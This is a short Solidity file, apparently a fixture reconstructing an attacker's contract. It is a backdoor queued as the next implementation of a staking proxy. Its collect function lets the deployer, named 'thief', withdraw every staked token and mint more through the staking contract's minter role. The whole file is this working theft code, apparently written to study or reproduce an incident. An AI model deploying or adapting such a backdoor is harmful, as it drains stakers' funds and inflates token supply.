// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

interface IMintable {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function mint(address to, uint256 amount) external;
}

/// What the thief queued as Staking's next implementation. The repo has no source for it.
/// Behind the proxy it can hand out every staked TOKEN and mint more with Staking's minter role.
contract StakingBackdoor {
    address immutable thief = msg.sender;

    function collect(IMintable token, uint256 extra) external {
        require(msg.sender == thief);
        token.transfer(thief, token.balanceOf(address(this)));
        token.mint(thief, extra);
    }
}
